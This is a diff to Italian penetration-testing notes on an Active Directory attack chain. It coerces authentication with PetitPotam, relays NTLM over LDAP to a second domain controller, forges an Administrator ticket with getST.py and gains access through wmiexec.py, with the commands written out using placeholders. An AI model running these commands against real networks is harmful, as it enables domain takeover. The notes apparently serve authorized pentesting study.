@@ -15,7 +15,7 @@ Appunti, metodologia di penetration test per il rilevamento di anomalie, elenco 
 
 ➤ PetitPotam sul Domain Controller
 
-➤ Uso di NTLMv1 come protocollo di autenticazione
+➤ Uso di NTLMv1 come protocollo di autenticazione (lo vedi con un Responder ad esempio)
 
 ➤ Almeno 2 Domain Controller
 
@@ -39,13 +39,17 @@ python3 PetitPotam.py -d <domain> <IP Attacker> <DC1 IP>
 
 ➤ La macchina attaccante riceve NTLM e lo inoltra al secondo DC tramite LDAP. Nello specifico l'attacco porta alla creazione di un nuovo computer macchina che gli viene assegnata la delega di impersonificare qualsiasi utente dentro DC1
 
-➤ Viene forgiato un Silver Ticket per impersonificare un Amminsitratore dentro DC1. 
+➤ Viene forgiato un Silver Ticket per impersonificare un Amminsitratore dentro DC1. Ti salva il TGS in Administrato.ccache
 
 ```
 python3 getST.py -spn cifs/<FQDN DC1> -impersonate Administrator <domain>/'<username computer macchina creato>'
 ```
 
-➤ Forgiato il ticket  
+➤ Forgiato il ticket è possibile accedere a DC1
+
+```
+KRB5CCNAME=Administrator.ccache python3 wmiexec.py -k -no-pass @FQDN DC1 
+```
 
 -----------------
 #### STEP 2. RECONNAISSANCE 🕵
